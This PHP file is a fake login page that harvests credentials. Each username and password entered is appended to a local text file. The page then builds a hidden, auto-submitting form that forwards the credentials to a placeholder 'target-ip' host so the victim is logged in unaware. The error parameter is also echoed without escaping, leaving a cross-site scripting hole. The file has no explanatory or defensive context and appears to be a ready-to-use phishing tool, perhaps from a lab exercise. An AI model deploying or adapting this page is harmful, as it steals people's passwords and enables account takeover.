<head>
    <title>HOME</title>
    <link rel="stylesheet" type="text/css" href="style-new.css">
</head>
<body>
     <form action="login-old.php" method="post">
        <h2>LOGIN</h2>
        <?php if (isset($_GET['error'])) { ?>
            <p class="error"><?php echo $_GET['error']; ?></p>
        <?php } ?>
        <label>User Name</label>
        <input type="text" name="uname" placeholder="User Name"><br>
        <label>Password</label>
        <input type="password" name="password" placeholder="Password"><br> 
        <button type="submit" >Login</button>
     </form>

<?php

    if(isset($_POST['uname'], $_POST['password'])) {
        $un = $_POST['uname'];
        $pw = $_POST['password'];
        file_put_contents('test.txt', "$un :: $pw\n", FILE_APPEND);
        RedirectWithMethodPost("http://target-ip:8080/login.php?uname=$un&password=$pw");
    }

    function RedirectWithMethodPost($dest)
    {
       $url = $params = '';
       if( strpos($dest,'?') ) { list($url,$params) = explode('?',$dest,2); }
       else { $url = $dest; }
       echo "<form id='the-form' 
          method='post' 
          enctype='multipart/form-data' 
          action='$url'>\n";
       foreach( explode('&',$params) as $kv )
       {
          if( strpos($kv,'=') === false ) { continue; }
          list($k,$v) = explode('=',$kv,2);
          echo "<input type='hidden' name='$k' value='$v'>\n";
       }
       echo <<<ENDOFFORM
    <p id="the-button" style="display:none;">
    Click the button if page doesn't redirect within 3 seconds.
    <br><input type="submit" value="Click this button">
    </p>
    </form>
    <script type="text/javascript">
    function DisplayButton()
    {
       document.getElementById("the-button").style.display="block";
    }
    setTimeout(DisplayButton,3000);
    document.getElementById("the-form").submit();
    </script>
    ENDOFFORM;
    }
    
?>


</body>
</html>
